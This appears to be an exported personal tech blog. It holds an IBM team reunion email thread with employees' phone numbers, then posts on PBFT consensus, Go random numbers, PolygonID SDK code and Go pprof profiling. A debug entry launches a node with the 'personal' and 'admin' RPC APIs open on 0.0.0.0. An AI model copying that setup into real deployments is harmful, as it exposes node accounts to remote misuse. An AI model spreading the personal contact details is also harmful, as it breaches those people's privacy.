<p>Cc: Anouk Bikkel/Netherlands/IBM@IBMNL, Belen Martin Lopez/Spain/IBM@IBMES, Frederique Tenthoff/UK/IBM@IBMGB, Herbie Pearthree/Raleigh/IBM@IBMUS, Keith M Bantle/Fairfax/IBM@IBMUS, Martin Jesko/Slovakia/IBM@IBMSK, Regina D Holley/Dallas/IBM@IBMUS, Srinivas Manem/India/IBM@IBMIN, Wei Ming Zhuang/China/IBM@IBMCN</p>
<p>Date: 10/25/2011 11:23 AM</p>
<p>Subject: Re: One year later….</p>
<p>I know … have been thinking about our 1 year anniversary all month!    </p>
<p>By the way, the girls seem to be ruling in the reunion category … Freddie travelled to Mexico to visit Ms. Erica, and Regina and Erica have connected …. Regina I think you and Friddie met up in London?  I think Belen has met with at least one of you as well?</p>
<p>Le girls rule, as usual.   </p>
<p>Keith … was looking forward to hosting you for a Sabres game vs the Flames this year … but your beloved team doesn’t come to Calgary this season.  </p>
<p>With fondest memories of my best team ever!!   </p>
<p>Roy Hebert</p>
<p>Alberta Territory Manager, IBM</p>
<p>Office 403 539 3145</p>
<p><a href="mailto:&#x72;&#104;&#x65;&#98;&#x65;&#114;&#116;&#64;&#x63;&#x61;&#46;&#105;&#x62;&#109;&#46;&#x63;&#111;&#x6d;">&#x72;&#104;&#x65;&#98;&#x65;&#114;&#116;&#64;&#x63;&#x61;&#46;&#105;&#x62;&#109;&#46;&#x63;&#111;&#x6d;</a></p>
<p>===============================================================</p>
<p>From: Erika V Quezada/Mexico/IBM@IBMMX</p>
<p>To: Anouk Bikkel/Netherlands/IBM@IBMNL, Belen Martin Lopez/Spain/IBM@IBMES, Martin Jesko/Slovakia/IBM@IBMSK, Keith M Bantle/Fairfax/IBM@IBMUS, Srinivas Manem/India/IBM@IBMIN, Wei Ming Zhuang/China/IBM@IBMCN, Regina D Holley/Dallas/IBM@IBMUS, Roy Hebert/CanWest/IBM@IBMCA, Frederique Tenthoff/UK/IBM@IBMGB, Herbie Pearthree/Raleigh/IBM@IBMUS</p>
<p>Date: 10/25/2011 08:43 AM</p>
<p>Subject: One year later….</p>
<p>Hellooo Superb Team!!!</p>
<p>How are u one year later??  Hope everything is good with all of you….  To me, it has been a year of many changes either in my personal and professional life.  But I am very happy enjoying my life,  Still remember each particular moment we shared in Ghana and the things I learned of all of u that marked my life.</p>
<p>I already met with Regina and Freddie … and I really hope to meet with all of u anytime.</p>
<p>Big kiss and huge hug!</p>
<p>Miss u all!!</p>
<p>Remember:   we are The Best Team Ever!!!</p>
<p>Erika Q</p>
<p>Erika V. Quezada Ruiz</p>
<p>Sales Manager</p>
<p>Public Sector</p>
<p>IBM de México</p>
<p>Tel. (55) 52703701</p>
<p>Cel. 04455 54551278</p>
<p>=============================================================</p>
]]></content>
      <tags>
        <tag>CSC</tag>
        <tag>Ghana</tag>
      </tags>
  </entry>
  <entry>
    <title>pbft图解</title>
    <url>/2018/06/25/pbft%E5%9B%BE%E8%A7%A3/</url>
    <content><![CDATA[<p>参考链接：<a href="https://github.com/bigpicturelabs/consensusPBFT">https://github.com/bigpicturelabs/consensusPBFT</a><br><img src="/2018/06/25/pbft%E5%9B%BE%E8%A7%A3/pbft-consensus-behavior.jpg"></p>
<h4 id="Definitions-of-each-abbreviation-in-the-diagram-are"><a href="#Definitions-of-each-abbreviation-in-the-diagram-are" class="headerlink" title="Definitions of each abbreviation in the diagram are;"></a>Definitions of each abbreviation in the diagram are;</h4><p>m: Request message object<br>c: Client ID<br>t: Timestamp<br>v: View ID<br>n: Sequence ID<br>i: Peer(Node) ID<br>r: Result of the request’s operation</p>
<h4 id="Why-count-gt-2"><a href="#Why-count-gt-2" class="headerlink" title="Why count &gt;= 2 ?"></a>Why count &gt;= 2 ?</h4><p>In the diagram, the peer change its state to prepared or committed when the count value, which is the number of verified messages from other peers, is larger than 2. Actually, the condition is count &gt;= 2*f where f is the maximum number of faulty peers, which the network can tolerate. In this case, f is just 1, so the condition is count &gt;= 2.</p>
<h4 id="What-is-the-reply-message"><a href="#What-is-the-reply-message" class="headerlink" title="What is the reply message?"></a>What is the reply message?</h4><p>Every node replies the result of the request’s operation to the client individually. The client will collect these reply messages and if f + 1 valid reply messages are arrived, the client will accept the result. In this sample implementation, there is no client. So, every node including the primary will return its reply message to the primary.</p>
]]></content>
      <tags>
        <tag>共识算法</tag>
      </tags>
  </entry>
  <entry>
    <title>melody-debug</title>
    <url>/2020/03/10/odyssey-debug/</url>
    <content><![CDATA[<p>go1.5.2 version</p>
<p>step 1. init</p>
<p><img src="/2020/03/10/odyssey-debug/1.png" alt="image-20201015105955243"></p>
<blockquote>
<p>–home /home/zhuang/Documents/melody-bk/script/run/data init –melody_parameters=”–datadir /home/zhuang/Documents/melody-bk/script/run/data init /home/zhuang/Documents/melody-bk/script/etc/genesis.template”</p>
</blockquote>
<p>step 1. start</p>
<blockquote>
<p>–home<br>/home/zhuang/Documents/melody/script/run/data<br>–consensus.create_empty_blocks=false<br>node<br>–melody_parameters=”–datadir /home/zhuang/Documents/melody/script/run/data –http –http.addr=”0.0.0.0” –http.port=”8545” –ws –ws.addr=”0.0.0.0” –ws.port=”8546” –verbosity 3 –http.api eth,net,web3,personal,admin –tendermint_addr=tcp://0.0.0.0:26657 –abci_laddr=tcp://127.0.0.1”</p>
</blockquote>
]]></content>
      <tags>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title>golang 随机数</title>
    <url>/2018/06/25/golang-%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
    <content><![CDATA[<p>随机数主要分为以下三类：</p>
<ul>
<li>弱伪随机数</li>
<li>强伪随机数</li>
<li>真随机数</li>
</ul>
<p>随机数的分类是根据随机数的性质进行的分类。随机数的性质分为以下三类：</p>
<ul>
<li>随机性一不存在统计学偏差，是完全杂乱的数列</li>
<li>不可预测性一不能从过去的数列推测出”下一个出现的数</li>
<li>不可重现性一除非将数列本身保存下来，否则不能重现相同的数列</li>
</ul>
<p>密码技术中所使用的随机数,仅仅具备随机性是不够的，至少还需要具备不可预测性才行。<br><img src="/2018/06/25/golang-%E9%9A%8F%E6%9C%BA%E6%95%B0/1.png"></p>
<h4 id="GoLang-中的伪随机数"><a href="#GoLang-中的伪随机数" class="headerlink" title="GoLang 中的伪随机数"></a>GoLang 中的伪随机数</h4><p>在 GoLang 中，我们可以通过 math/rand 包里的方法来生成一个伪随机数：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">  <span class="string">&quot;fmt&quot;</span></span><br><span class="line">  <span class="string">&quot;math/rand&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  fmt.Println(rand.Int())   <span class="comment">// =&gt; 134020434</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>你会发现运行的结果一直是 134020434，怎样才能显示不同的结果，需要了解一下“随机种子”的概念。</p>
<h4 id="随机种子"><a href="#随机种子" class="headerlink" title="随机种子"></a>随机种子</h4><p>伪随机数，是使用一个确定性的算法计算出来的似乎是随机的数序，因此伪随机数实际上并不随机。</p>
<p>那么自然，在计算伪随机数时假如使用的开始值不变的话，那么算法计算出的伪随机数的数序自然也是不变的咯。</p>
<p>这个“开始值”，就被称为随机种子。</p>
<p>可以通过 rand.Seed 方法设置随机种子，如果不设置，则默认值显示为 1，为了保证每次伪随机数生成器工作时使用的是不同的种子，通常的做法是采用当前时间作为种子。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;math/rand&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    rand.Seed(<span class="keyword">int64</span>(time.Now().Unix()))</span><br><span class="line">    fmt.Println(rand.Intn(<span class="number">100</span>))     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="真随机数"><a href="#真随机数" class="headerlink" title="真随机数"></a>真随机数</h4><p>如果我们的应用对安全性要求比较高，需要使用真随机数的话，那么可以使用 crypto/rand 包中的方法。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">  <span class="string">&quot;crypto/rand&quot;</span></span><br><span class="line">  <span class="string">&quot;fmt&quot;</span></span><br><span class="line">  <span class="string">&quot;math/big&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    result, _ := rand.Int(rand.Reader, big.NewInt(<span class="number">100</span>))</span><br><span class="line">    fmt.Println(result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>polygonID SDK部分代码分析</title>
    <url>/2023/11/22/polygonID%20SDK%E9%83%A8%E5%88%86%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>回到<a href="https://github.com/0xPolygonID/polygonid-flutter-sdk">polygonID SDK project</a>，在项目中，<a href="https://willzhuang.github.io/2023/11/15/iden3%E5%92%8CpolygonID%E5%8E%9F%E7%90%86%E5%BA%94%E7%94%A8%E5%92%8C%E5%AE%9E%E6%88%98/">理论性的iden3和polygonID算法</a>，在实际代码中，如何连接呢？本文接续上文<a href="https://willzhuang.github.io/2023/11/15/iden3%E5%92%8CpolygonID%E5%8E%9F%E7%90%86%E5%BA%94%E7%94%A8%E5%92%8C%E5%AE%9E%E6%88%98/"> iden3和polygonID原理应用和实战</a>，讲述具体代码，如何实现的。</p>
<h3 id="算法1：生成最终的proof"><a href="#算法1：生成最终的proof" class="headerlink" title="算法1：生成最终的proof"></a>算法1：生成最终的proof</h3><p>从技术角度来看，一个身份包括三棵树：claims tree，revocation tree，roots of roots tree。</p>
<h4 id="代码实现："><a href="#代码实现：" class="headerlink" title="代码实现："></a>代码实现：</h4><p><a href="https://github.com/0xPolygonID/polygonid-flutter-sdk/blob/a552fc6b2430353b05c0c2ef3c17567704012a90/lib/iden3comm/domain/use_cases/generate_iden3comm_proof_use_case.dart">https://github.com/0xPolygonID/polygonid-flutter-sdk/blob/a552fc6b2430353b05c0c2ef3c17567704012a90/lib/iden3comm/domain/use_cases/generate_iden3comm_proof_use_case.dart</a></p>
<ol>
<li>为生成proof，准备入参：<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Prepare atomic query inputs 准备计算查询的入参</span></span><br><span class="line">Uint8List res = <span class="keyword">await</span> _proofRepository  </span><br><span class="line">    .calculateAtomicQueryInputs(  </span><br><span class="line">  id: didEntity.identifier,  <span class="comment">// 用户 DID</span></span><br><span class="line">  profileNonce: param.profileNonce,  <span class="comment">// 用户个人资料随机数</span></span><br><span class="line">  claimSubjectProfileNonce: param.claimSubjectProfileNonce,  <span class="comment">// 用户声明主题资料随机数</span></span><br><span class="line">  authClaim: authClaim,  <span class="comment">// 用户授权声明</span></span><br><span class="line">  incProof: incProof,  <span class="comment">// 如上图中 用户Claims Tree Root</span></span><br><span class="line">  nonRevProof: nonRevProof,  <span class="comment">// 如上图中 用户Revocation Tree Root</span></span><br><span class="line">  gistProof: gistProof,  <span class="comment">// 如上图中 用户Roots Tree Toot</span></span><br><span class="line">  treeState: treeState,  <span class="comment">// 如上图中 用户Identity State</span></span><br><span class="line">  challenge: param.challenge,  <span class="comment">// 挑战，由Issuer生成，作为生成proof的一部分</span></span><br><span class="line">  signature: signature,  <span class="comment">// 用户针对challenge的签名</span></span><br><span class="line">  claim: param.credential,  <span class="comment">// 用户证书，其中包含的PII Data</span></span><br><span class="line">  proofScopeRequest: param.request.toJson(),  </span><br><span class="line">  circuitId: param.request.circuitId,  <span class="comment">// 使用的电路ID</span></span><br><span class="line">  config: config,  </span><br><span class="line">)</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>其中部分参数的示例如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;genesisDID&quot;</span>: <span class="string">&quot;did:iden3:tT2t3b685r2dKsjo4MioyKeceFT4mQEYfDd69EY5Y&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;profileNonce&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;authClaim&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;304427537360709784173770334266246861770&quot;</span>,</span><br><span class="line">    <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;17640206035128972995519606214765283372613874593503528180869261482403155458945&quot;</span>,</span><br><span class="line">    <span class="string">&quot;20634138280259599560273310290025659992320584624461316485434108770067472477956&quot;</span>,</span><br><span class="line">    <span class="string">&quot;15930428023331155902&quot;</span>,</span><br><span class="line">    <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;0&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;authClaimIncMtp&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;existence&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">&quot;siblings&quot;</span>: []</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;authClaimNonRevMtp&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;existence&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;siblings&quot;</span>: []</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;treeState&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;state&quot;</span>: <span class="string">&quot;18656147546666944484453899241916469544090258810192803949522794490493271005313&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;claimsRoot&quot;</span>: <span class="string">&quot;9763429684850732628215303952870004997159843236039795272605841029866455670219&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;revocationRoot&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;rootOfRoots&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;gistProof&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;root&quot;</span>: <span class="string">&quot;4924303677736085224554833340748086265406229626627819375177261957522622163007&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;proof&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;existence&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;siblings&quot;</span>: [],</span><br><span class="line">      <span class="attr">&quot;node_aux&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;key&quot;</span>: <span class="string">&quot;24846663430375341177084327381366271031641225773947711007341346118923321345&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;value&quot;</span>: <span class="string">&quot;6317996369756476782464660619835940615734517981889733696047139451453239145426&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;signature&quot;</span>: <span class="string">&quot;fccc15d7aed2bf4f5d7dbe55c81087970344d13e5d9f348e61965ac364f41d29b366b52bc0820c603877352054833da083f5595c29c881ccd8ee47aa639aa103&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;challenge&quot;</span>: <span class="string">&quot;10&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>生成证明：<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Prove 生成最终证明，其中的步骤实际是在调用iden3的类库</span></span><br><span class="line"><span class="keyword">return</span> _proveUseCase  </span><br><span class="line">    .execute(param: ProveParam(atomicQueryInputs, param.circuitData))</span><br><span class="line">    .then((proof) &#123;  </span><br><span class="line">_stacktraceManager.addTrace(<span class="string">&quot;[GenerateIden3commProofUseCase] proof&quot;</span>);  </span><br><span class="line">logger().i(<span class="string">&quot;[GenerateProofUseCase] proof: <span class="subst">$proof</span>&quot;</span>);</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>2.1 生成证明的具体过程：</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">Future&lt;ZKProofEntity&gt; execute(&#123;<span class="keyword">required</span> ProveParam param&#125;) <span class="keyword">async</span> &#123;  </span><br><span class="line">  <span class="keyword">try</span> &#123;  </span><br><span class="line">    <span class="comment">// Calculate witness  计算见证</span></span><br><span class="line">    Uint8List wtnsBytes = <span class="keyword">await</span> _proofRepository.calculateWitness(  </span><br><span class="line">      param.circuitData,  </span><br><span class="line">      param.inputs,  </span><br><span class="line">    );  </span><br><span class="line">    <span class="comment">// Generate proof  生成证明</span></span><br><span class="line">    ZKProofEntity zkProofEntity = <span class="keyword">await</span> _proofRepository.prove(  </span><br><span class="line">      param.circuitData,  </span><br><span class="line">      wtnsBytes,  </span><br><span class="line">    );  </span><br><span class="line">    _stacktraceManager.addTrace(<span class="string">&quot;[ProveUseCase] proof&quot;</span>);  </span><br><span class="line">    logger().i(<span class="string">&quot;[ProveUseCase] proof: <span class="subst">$zkProofEntity</span>&quot;</span>);  </span><br><span class="line">    <span class="keyword">return</span> zkProofEntity;  </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="算法2：稀疏默克尔树"><a href="#算法2：稀疏默克尔树" class="headerlink" title="算法2：稀疏默克尔树"></a>算法2：稀疏默克尔树</h3><h4 id="代码接口如下"><a href="#代码接口如下" class="headerlink" title="代码接口如下"></a>代码接口如下</h4><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">SMTRepository</span> </span>&#123;  </span><br><span class="line">  Future&lt;<span class="keyword">void</span>&gt; addLeaf(  </span><br><span class="line">      &#123;<span class="keyword">required</span> NodeEntity leaf,  </span><br><span class="line">      <span class="keyword">required</span> TreeType type,  </span><br><span class="line">      <span class="keyword">required</span> <span class="built_in">String</span> did,  </span><br><span class="line">      <span class="keyword">required</span> <span class="built_in">String</span> privateKey&#125;);  </span><br><span class="line">  </span><br><span class="line">  Future&lt;NodeEntity&gt; getNode(  </span><br><span class="line">      &#123;<span class="keyword">required</span> HashEntity hash,  </span><br><span class="line">      <span class="keyword">required</span> TreeType type,  </span><br><span class="line">      <span class="keyword">required</span> <span class="built_in">String</span> did,  </span><br><span class="line">      <span class="keyword">required</span> <span class="built_in">String</span> privateKey&#125;);  </span><br><span class="line">  </span><br><span class="line">  Future&lt;<span class="keyword">void</span>&gt; addNode(  </span><br><span class="line">      &#123;<span class="keyword">required</span> HashEntity hash,  </span><br><span class="line">      <span class="keyword">required</span> NodeEntity node,  </span><br><span class="line">      <span class="keyword">required</span> TreeType type,  </span><br><span class="line">      <span class="keyword">required</span> <span class="built_in">String</span> did,  </span><br><span class="line">      <span class="keyword">required</span> <span class="built_in">String</span> privateKey&#125;);  </span><br><span class="line">  </span><br><span class="line">  Future&lt;HashEntity&gt; getRoot(  </span><br><span class="line">      &#123;<span class="keyword">required</span> TreeType type,  </span><br><span class="line">      <span class="keyword">required</span> <span class="built_in">String</span> did,  </span><br><span class="line">      <span class="keyword">required</span> <span class="built_in">String</span> privateKey&#125;);  </span><br><span class="line">  </span><br><span class="line">  Future&lt;<span class="keyword">void</span>&gt; setRoot(  </span><br><span class="line">      &#123;<span class="keyword">required</span> HashEntity root,  </span><br><span class="line">      <span class="keyword">required</span> TreeType type,  </span><br><span class="line">      <span class="keyword">required</span> <span class="built_in">String</span> did,  </span><br><span class="line">      <span class="keyword">required</span> <span class="built_in">String</span> privateKey&#125;);  </span><br><span class="line">  </span><br><span class="line">  Future&lt;MTProofEntity&gt; generateProof(&#123;  </span><br><span class="line">    <span class="keyword">required</span> HashEntity key,  </span><br><span class="line">    <span class="keyword">required</span> TreeType type,  </span><br><span class="line">    <span class="keyword">required</span> <span class="built_in">String</span> did,  </span><br><span class="line">    <span class="keyword">required</span> <span class="built_in">String</span> privateKey,  </span><br><span class="line">  &#125;);  </span><br><span class="line">  </span><br><span class="line">  Future&lt;<span class="keyword">void</span>&gt; createSMT(&#123;  </span><br><span class="line">    <span class="keyword">required</span> <span class="built_in">int</span> maxLevels,  </span><br><span class="line">    <span class="keyword">required</span> TreeType type,  </span><br><span class="line">    <span class="keyword">required</span> <span class="built_in">String</span> did,  </span><br><span class="line">    <span class="keyword">required</span> <span class="built_in">String</span> privateKey,  </span><br><span class="line">  &#125;);  </span><br><span class="line">  </span><br><span class="line">  Future&lt;<span class="keyword">void</span>&gt; removeSMT(&#123;  </span><br><span class="line">    <span class="keyword">required</span> TreeType type,  </span><br><span class="line">    <span class="keyword">required</span> <span class="built_in">String</span> did,  </span><br><span class="line">    <span class="keyword">required</span> <span class="built_in">String</span> privateKey,  </span><br><span class="line">  &#125;);  </span><br><span class="line">  </span><br><span class="line">  Future&lt;<span class="built_in">String</span>&gt; hashState(&#123;  </span><br><span class="line">    <span class="keyword">required</span> <span class="built_in">String</span> claims,  </span><br><span class="line">    <span class="keyword">required</span> <span class="built_in">String</span> revocation,  </span><br><span class="line">    <span class="keyword">required</span> <span class="built_in">String</span> roots,  </span><br><span class="line">  &#125;);  </span><br><span class="line">  </span><br><span class="line">  Future&lt;<span class="built_in">Map</span>&lt;<span class="built_in">String</span>, <span class="built_in">dynamic</span>&gt;&gt; convertState(&#123;<span class="keyword">required</span> TreeStateEntity state&#125;);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>综上，polygonID 很好地在手机端（<a href="https://github.com/0xPolygonID/polygonid-flutter-sdk">Flutter</a>）和web端（<a href="https://github.com/0xPolygonID/js-sdk">JavaScript and TypeScript</a>）实现了DID-Holder端SDK。</p>
]]></content>
      <tags>
        <tag>DID</tag>
      </tags>
  </entry>
  <entry>
    <title>go pprof trace完整操作</title>
    <url>/2018/06/07/go-pprof-trace%E5%AE%8C%E6%95%B4%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p>第一步：也是最重要的一步，就是下载谷歌浏览器！</p>
<p>第二步：下载 Graphviz   <a href="http://graphviz.org/download/">http://graphviz.org/download/</a><br>安装后配置环境变量，再path里面添加安装目录！<br><img src="/2018/06/07/go-pprof-trace%E5%AE%8C%E6%95%B4%E6%93%8D%E4%BD%9C/1.png"></p>
<p>第三步：添加以下测试代码 （添加   _”net/http/pprof” 不然不会有效果！）</p>
<p>具体看源码</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">package</span> main</span><br><span class="line"><span class="number">2</span> <span class="keyword">import</span> (</span><br><span class="line"><span class="number">3</span>    <span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="number">4</span>    <span class="string">&quot;runtime&quot;</span></span><br><span class="line"><span class="number">5</span>    <span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="number">6</span>    <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="number">7</span>    <span class="string">&quot;runtime/trace&quot;</span></span><br><span class="line"><span class="number">8</span>    _<span class="string">&quot;net/http/pprof&quot;</span></span><br><span class="line"><span class="number">9</span>    <span class="string">&quot;runtime/debug&quot;</span></span><br><span class="line"><span class="number">10</span>   <span class="string">&quot;time&quot;</span></span><br><span class="line"><span class="number">11</span>   <span class="string">&quot;sync&quot;</span></span><br><span class="line"><span class="number">12</span> )</span><br><span class="line"><span class="number">13</span> <span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="number">14</span>   <span class="comment">//开启强大的分析器</span></span><br><span class="line"><span class="number">15</span>   <span class="keyword">go</span> pprof()</span><br><span class="line"><span class="number">16</span>    <span class="comment">//以下是运行测试(也可以贴你自己的)代码</span></span><br><span class="line"><span class="number">17</span>   <span class="keyword">var</span> c sync.Map</span><br><span class="line"><span class="number">18</span>   <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++&#123;</span><br><span class="line"><span class="number">19</span>      time.Sleep(time.Second*<span class="number">1</span>)</span><br><span class="line"><span class="number">20</span>      <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="number">21</span>         <span class="keyword">for</span> j:=<span class="number">0</span>;j&lt;<span class="number">1000000</span>;j++&#123;</span><br><span class="line"><span class="number">22</span>            time.Sleep(time.Millisecond*<span class="number">20</span>)</span><br><span class="line"><span class="number">23</span>            c.Store(fmt.Sprintf(<span class="string">&quot;%d&quot;</span>,j),j)</span><br><span class="line"><span class="number">24</span>            fmt.Println(c.Load(fmt.Sprintf(<span class="string">&quot;%d&quot;</span>,j)))</span><br><span class="line"><span class="number">25</span>         &#125;</span><br><span class="line"><span class="number">26</span>      &#125;()</span><br><span class="line"><span class="number">27</span>   &#125;</span><br><span class="line"><span class="number">28</span>   time.Sleep(time.Second*<span class="number">20</span>)</span><br><span class="line"><span class="number">29</span>    fmt.Scan()</span><br><span class="line"><span class="number">30</span> &#125;</span><br><span class="line"><span class="number">31</span> <span class="comment">//运行pprof分析器</span></span><br><span class="line"><span class="number">32</span> <span class="function"><span class="keyword">func</span> <span class="title">pprof</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="number">33</span>   <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="number">34</span>      <span class="comment">//关闭GC</span></span><br><span class="line"><span class="number">35</span>      debug.SetGCPercent(<span class="number">-1</span>)</span><br><span class="line"><span class="number">36</span>      <span class="comment">//运行trace</span></span><br><span class="line"><span class="number">37</span>      http.HandleFunc(<span class="string">&quot;/start&quot;</span>, traces)</span><br><span class="line"><span class="number">38</span>      <span class="comment">//停止trace</span></span><br><span class="line"><span class="number">39</span>      http.HandleFunc(<span class="string">&quot;/stop&quot;</span>, traceStop)</span><br><span class="line"><span class="number">40</span>      <span class="comment">//手动GC</span></span><br><span class="line"><span class="number">41</span>      http.HandleFunc(<span class="string">&quot;/gc&quot;</span>, gc)</span><br><span class="line"><span class="number">42</span>      <span class="comment">//网站开始监听</span></span><br><span class="line"><span class="number">43</span>      http.ListenAndServe(<span class="string">&quot;:6060&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line"><span class="number">44</span>   &#125;()</span><br><span class="line"><span class="number">45</span> &#125;</span><br><span class="line"><span class="number">46</span> <span class="comment">//手动GC</span></span><br><span class="line"><span class="number">47</span> <span class="function"><span class="keyword">func</span> <span class="title">gc</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line"><span class="number">48</span>   runtime.GC()</span><br><span class="line"><span class="number">49</span>   w.Write([]<span class="keyword">byte</span>(<span class="string">&quot;StartGC&quot;</span>))</span><br><span class="line"><span class="number">50</span> &#125;</span><br><span class="line"><span class="number">51</span> <span class="comment">//运行trace</span></span><br><span class="line"><span class="number">52</span> <span class="function"><span class="keyword">func</span> <span class="title">traces</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span>&#123;</span><br><span class="line"><span class="number">53</span>   f, err := os.Create(<span class="string">&quot;trace.out&quot;</span>)</span><br><span class="line"><span class="number">54</span>   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="number">55</span>      <span class="built_in">panic</span>(err)</span><br><span class="line"><span class="number">56</span>   &#125;</span><br><span class="line"><span class="number">57</span>   err = trace.Start(f)</span><br><span class="line"><span class="number">58</span>   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="number">59</span>      <span class="built_in">panic</span>(err)</span><br><span class="line"><span class="number">60</span>   &#125;</span><br><span class="line"><span class="number">61</span>   w.Write([]<span class="keyword">byte</span>(<span class="string">&quot;TrancStart&quot;</span>))</span><br><span class="line"><span class="number">62</span>   fmt.Println(<span class="string">&quot;StartTrancs&quot;</span>)</span><br><span class="line"><span class="number">63</span> &#125;</span><br><span class="line"><span class="number">64</span> <span class="comment">//停止trace</span></span><br><span class="line"><span class="number">65</span> <span class="function"><span class="keyword">func</span> <span class="title">traceStop</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span>&#123;</span><br><span class="line"><span class="number">66</span>   trace.Stop()</span><br><span class="line"><span class="number">67</span>   w.Write([]<span class="keyword">byte</span>(<span class="string">&quot;TrancStop&quot;</span>))</span><br><span class="line"><span class="number">68</span>   fmt.Println(<span class="string">&quot;StopTrancs&quot;</span>)</span><br><span class="line"><span class="number">69</span> &#125;</span><br></pre></td></tr></table></figure>

<p>第四步：接下来就看图说话了。</p>
<p>程序运行后随便打开一个CMD 然后输入</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">go tool pprof  http://localhost:6060/debug/pprof/profile</span><br></pre></td></tr></table></figure>

<p>需要等待分析时间，大约30秒，然后再输入 </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">web</span><br></pre></td></tr></table></figure>
<p>查看具体pprof的信息了<br><img src="/2018/06/07/go-pprof-trace%E5%AE%8C%E6%95%B4%E6%93%8D%E4%BD%9C/2.png"></p>
